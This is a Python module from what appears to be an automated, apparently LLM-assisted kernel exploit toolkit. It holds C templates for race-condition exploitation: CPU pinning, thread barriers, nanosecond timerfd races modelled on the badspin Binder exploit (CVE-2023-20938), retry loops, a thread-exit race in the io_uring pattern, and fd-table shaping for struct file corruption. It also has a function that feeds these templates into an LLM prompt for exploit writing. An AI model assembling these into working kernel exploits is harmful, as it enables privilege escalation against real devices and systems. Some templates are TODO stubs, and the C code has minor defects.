"""
exploit.race_primitives — Race condition exploit templates.

Many kernel vulnerabilities are race conditions that require precise
timing to exploit.  This module provides reusable C code templates for
common race patterns: timer-based races, thread barriers, CPU pinning,
retry loops, and TOCTOU helpers.

Patterns from kernel_PoCs:
  - badspin:    25 timer threads × 75 epoll watches × nanosecond skews
  - bad_io_uring: thread exit racing against io_uring IOPOLL
  - badnode:    multi-process binder refcount race
"""

from __future__ import annotations

from typing import Any, Dict, List, Optional


# ═════════════════════════════════════════════════════════════════════
# CPU pinning (used by ALL race exploits)
# ═════════════════════════════════════════════════════════════════════

CPU_PINNING = r"""
/* ── CPU pinning for race exploits ───────────────────────────────────
 *
 * Pin the current thread/process to a specific CPU core.  Essential
 * for race condition exploits to ensure the racing threads share a
 * cache line and have deterministic scheduling.
 */
#define _GNU_SOURCE
#include <sched.h>
#include <pthread.h>
#include <stdio.h>

static int pin_to_cpu(int cpu) {
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    if (sched_setaffinity(0, sizeof(set), &set) < 0) {
        perror("sched_setaffinity");
        return -1;
    }
    return 0;
}

/* Pin a pthread to a specific CPU */
static int pin_thread_to_cpu(pthread_t thread, int cpu) {
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    return pthread_setaffinity_np(thread, sizeof(set), &set);
}

/* Get number of online CPUs */
static int get_nprocs_online(void) {
    return sysconf(_SC_NPROCESSORS_ONLN);
}
"""


# ═════════════════════════════════════════════════════════════════════
# Thread barrier (synchronize N threads to start simultaneously)
# ═════════════════════════════════════════════════════════════════════

THREAD_BARRIER = r"""
/* ── Thread barrier for synchronized racing ──────────────────────────
 *
 * Synchronize N threads to start their race attempts at the same moment.
 * Uses pthread_barrier for precise synchronization.
 */
#include <pthread.h>
#include <stdio.h>

static pthread_barrier_t race_barrier;

static int init_race_barrier(int n_threads) {
    return pthread_barrier_init(&race_barrier, NULL, n_threads);
}

static void race_barrier_wait(void) {
    pthread_barrier_wait(&race_barrier);
}

static void destroy_race_barrier(void) {
    pthread_barrier_destroy(&race_barrier);
}
"""


# ═════════════════════════════════════════════════════════════════════
# Timer-based race (nanosecond precision, like badspin)
# ═════════════════════════════════════════════════════════════════════

TIMER_RACE = r"""
/* ── Timer-based race condition exploit ──────────────────────────────
 *
 * Uses timerfd + epoll to create precise timing windows for races.
 * Multiple timer threads fire at nanosecond-offset intervals to hit
 * a narrow race window.  Pattern from badspin (CVE-2023-20938).
 *
 * Strategy:
 *   1. Create N timer threads, each with a timerfd
 *   2. Set timers to fire at base_ns + (i * skew_ns)
 *   3. Each timer thread performs the racing operation on fire
 *   4. One of the threads will hit the race window
 */
#include <sys/timerfd.h>
#include <sys/epoll.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <time.h>
#include <string.h>

#define MAX_RACE_THREADS 64

typedef struct {
    int timer_fd;
    int epoll_fd;
    int thread_id;
    uint64_t skew_ns;        /* nanosecond offset from base */
    volatile int *race_won;  /* shared flag: set to 1 when race is won */
    void *user_data;
} timer_race_ctx_t;

/* Callback type: called when the timer fires.
 * Return 0 = race not won yet, 1 = race won. */
typedef int (*race_callback_t)(timer_race_ctx_t *ctx);

static race_callback_t _race_cb = NULL;

static void *timer_race_thread(void *arg) {
    timer_race_ctx_t *ctx = (timer_race_ctx_t *)arg;
    struct epoll_event ev;

    /* Wait for timer to fire */
    int n = epoll_wait(ctx->epoll_fd, &ev, 1, 5000);
    if (n <= 0) return NULL;

    /* Read the timerfd to acknowledge */
    uint64_t val;
    read(ctx->timer_fd, &val, sizeof(val));

    /* Execute the racing operation */
    if (_race_cb && !*ctx->race_won) {
        if (_race_cb(ctx)) {
            *ctx->race_won = 1;
        }
    }
    return NULL;
}

/* Start a timer-based race with N threads.
 * base_ns:  base timer value (nanoseconds from now)
 * skew_ns:  nanosecond offset between each thread's timer
 * callback: function to call when each timer fires
 * Returns 1 if race was won, 0 otherwise. */
static int run_timer_race(int n_threads, uint64_t base_ns, uint64_t skew_ns,
                          race_callback_t callback, void *user_data) {
    if (n_threads > MAX_RACE_THREADS) n_threads = MAX_RACE_THREADS;

    _race_cb = callback;
    volatile int race_won = 0;
    timer_race_ctx_t ctxs[MAX_RACE_THREADS];
    pthread_t threads[MAX_RACE_THREADS];

    /* Set up timer fds and epoll */
    for (int i = 0; i < n_threads; i++) {
        ctxs[i].thread_id = i;
        ctxs[i].race_won = &race_won;
        ctxs[i].user_data = user_data;
        ctxs[i].skew_ns = base_ns + i * skew_ns;

        ctxs[i].timer_fd = timerfd_create(CLOCK_MONOTONIC, 0);
        ctxs[i].epoll_fd = epoll_create1(0);

        struct epoll_event ev = { .events = EPOLLIN, .data.fd = ctxs[i].timer_fd };
        epoll_ctl(ctxs[i].epoll_fd, EPOLL_CTL_ADD, ctxs[i].timer_fd, &ev);

        struct itimerspec its = {0};
        its.it_value.tv_sec  = ctxs[i].skew_ns / 1000000000ULL;
        its.it_value.tv_nsec = ctxs[i].skew_ns % 1000000000ULL;
        timerfd_settime(ctxs[i].timer_fd, 0, &its, NULL);
    }

    /* Launch all threads */
    for (int i = 0; i < n_threads; i++) {
        pthread_create(&threads[i], NULL, timer_race_thread, &ctxs[i]);
    }

    /* Wait for all threads */
    for (int i = 0; i < n_threads; i++) {
        pthread_join(threads[i], NULL);
    }

    /* Cleanup */
    for (int i = 0; i < n_threads; i++) {
        close(ctxs[i].timer_fd);
        close(ctxs[i].epoll_fd);
    }

    return race_won;
}
"""


# ═════════════════════════════════════════════════════════════════════
# Retry-until-win loop
# ═════════════════════════════════════════════════════════════════════

RETRY_LOOP = r"""
/* ── Retry-until-win race loop ───────────────────────────────────────
 *
 * Many race exploits are probabilistic — they need multiple attempts.
 * This provides a configurable retry loop with progress reporting.
 */
#include <stdio.h>
#include <unistd.h>
#include <time.h>

/* Run a race attempt function up to max_attempts times.
 * Returns the attempt number on success (1-based), 0 on failure.
 * attempt_fn should return 0 on success, -1 on failure. */
static int retry_race(int (*attempt_fn)(void *ctx), void *ctx,
                      int max_attempts, int delay_us) {
    struct timespec start, now;
    clock_gettime(CLOCK_MONOTONIC, &start);

    for (int i = 1; i <= max_attempts; i++) {
        if (i % 100 == 0) {
            clock_gettime(CLOCK_MONOTONIC, &now);
            double elapsed = (now.tv_sec - start.tv_sec) +
                (now.tv_nsec - start.tv_nsec) / 1e9;
            printf("[*] Race attempt %d/%d (%.1fs elapsed)\n",
                   i, max_attempts, elapsed);
        }

        if (attempt_fn(ctx) == 0) {
            printf("[+] Race won on attempt %d\n", i);
            return i;
        }

        if (delay_us > 0) usleep(delay_us);
    }

    printf("[-] Race failed after %d attempts\n", max_attempts);
    return 0;
}
"""


# ═════════════════════════════════════════════════════════════════════
# Thread exit race (io_uring pattern)
# ═════════════════════════════════════════════════════════════════════

THREAD_EXIT_RACE = r"""
/* ── Thread exit race pattern ────────────────────────────────────────
 *
 * Race between a thread performing an operation and another thread
 * exiting.  The exit causes cleanup that races with the operation.
 * Pattern from bad_io_uring: thread submits io_uring op, then exits
 * while another thread is polling.
 */
#include <pthread.h>
#include <stdio.h>
#include <unistd.h>

typedef struct {
    volatile int should_exit;
    volatile int op_done;
    volatile int race_won;
    void *user_data;
} thread_exit_race_ctx_t;

/* Thread that performs the racing operation then exits */
static void *racing_thread(void *arg) {
    thread_exit_race_ctx_t *ctx = (thread_exit_race_ctx_t *)arg;

    /* TODO: perform the operation that races with exit cleanup */
    /* Example: submit io_uring request, open/close file, etc. */

    ctx->op_done = 1;
    /* Thread exit triggers cleanup path that races */
    return NULL;
}

/* Thread that polls/waits for the race condition */
static void *polling_thread(void *arg) {
    thread_exit_race_ctx_t *ctx = (thread_exit_race_ctx_t *)arg;

    /* TODO: perform the polling/waiting operation */
    /* Example: io_uring_enter(IORING_ENTER_GETEVENTS), epoll_wait, etc. */

    return NULL;
}

static int run_thread_exit_race(thread_exit_race_ctx_t *ctx) {
    pthread_t t_race, t_poll;

    pthread_create(&t_poll, NULL, polling_thread, ctx);
    usleep(1000);  /* Let polling thread start */
    pthread_create(&t_race, NULL, racing_thread, ctx);

    pthread_join(t_race, NULL);
    pthread_join(t_poll, NULL);

    return ctx->race_won;
}
"""


# ═════════════════════════════════════════════════════════════════════
# FD table shaping (badspin pattern)
# ═════════════════════════════════════════════════════════════════════

FD_TABLE_SHAPING = r"""
/* ── FD table shaping ────────────────────────────────────────────────
 *
 * Pre-allocate file descriptors to control which fd slot a target
 * file struct lands in.  Used by badspin to predict fd numbers for
 * corrupted file structs.
 *
 * Pattern: open dummy fds to push the fd counter to a desired value,
 * then the next open() returns the predicted fd number.
 */
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>

/* Fill fd table with dummy fds up to target_fd.
 * After this, the next open/socket/etc. will return target_fd.
 * Returns array of dummy fds (caller must free). */
static int *shape_fd_table(int target_fd, int *n_dummies) {
    int *dummies = calloc(target_fd, sizeof(int));
    int count = 0;

    for (int i = 0; i < target_fd; i++) {
        int fd = open("/dev/null", O_RDONLY);
        if (fd < 0) break;
        if (fd >= target_fd) {
            close(fd);
            break;
        }
        dummies[count++] = fd;
    }

    *n_dummies = count;
    printf("[*] Shaped fd table: next fd should be ~%d (opened %d dummies)\n",
           target_fd, count);
    return dummies;
}

/* Close all dummy fds to clean up */
static void release_fd_shaping(int *dummies, int n_dummies) {
    for (int i = 0; i < n_dummies; i++) {
        close(dummies[i]);
    }
    free(dummies);
}
"""


# ═════════════════════════════════════════════════════════════════════
# Registry
# ═════════════════════════════════════════════════════════════════════

_RACE_PRIMITIVES: Dict[str, Dict[str, Any]] = {
    "cpu_pinning": {
        "code": CPU_PINNING,
        "description": "Pin thread/process to specific CPU core for race reliability.",
        "race_types": ["any"],
    },
    "thread_barrier": {
        "code": THREAD_BARRIER,
        "description": "Synchronize N threads to start race attempts simultaneously.",
        "race_types": ["concurrent_access", "toctou"],
    },
    "timer_race": {
        "code": TIMER_RACE,
        "description": (
            "Timer-based race with nanosecond-precision thread scheduling. "
            "Pattern from badspin."
        ),
        "race_types": ["spinlock_race", "timer_race", "narrow_window"],
    },
    "retry_loop": {
        "code": RETRY_LOOP,
        "description": "Retry-until-win loop with progress reporting.",
        "race_types": ["any"],
    },
    "thread_exit_race": {
        "code": THREAD_EXIT_RACE,
        "description": (
            "Thread exit racing against ongoing operation. "
            "Pattern from bad_io_uring."
        ),
        "race_types": ["thread_exit", "cleanup_race", "io_uring"],
    },
    "fd_table_shaping": {
        "code": FD_TABLE_SHAPING,
        "description": (
            "Pre-shape fd table to control which slot a file struct "
            "lands in. Pattern from badspin."
        ),
        "race_types": ["fd_race", "struct_file_corruption"],
    },
}


class RacePrimitiveLibrary:
    """Library of race condition exploit primitives."""

    def get(self, name: str) -> Optional[Dict[str, Any]]:
        return _RACE_PRIMITIVES.get(name)

    def get_code(self, name: str) -> str:
        prim = _RACE_PRIMITIVES.get(name)
        return prim["code"] if prim else ""

    def list_all(self) -> List[str]:
        return list(_RACE_PRIMITIVES.keys())

    def recommend_for_race_type(self, race_type: str) -> List[str]:
        """Recommend race primitives for a given race type."""
        rt = race_type.lower().replace("-", "_").replace(" ", "_")
        results = []
        for name, info in _RACE_PRIMITIVES.items():
            if rt in info["race_types"] or "any" in info["race_types"]:
                results.append(name)
        return results

    def format_for_prompt(self, race_type: Optional[str] = None) -> str:
        """Format race primitives for LLM prompt."""
        lines = [
            "=== Available Race Condition Templates ===",
            "These templates help exploit race condition vulnerabilities:",
            "",
        ]
        for name, info in _RACE_PRIMITIVES.items():
            if race_type and race_type not in info["race_types"] and "any" not in info["race_types"]:
                continue
            lines.append(f"  {name}: {info['description']}")
            lines.append(f"    race types: {', '.join(info['race_types'])}")
            lines.append("")
        return "\n".join(lines)
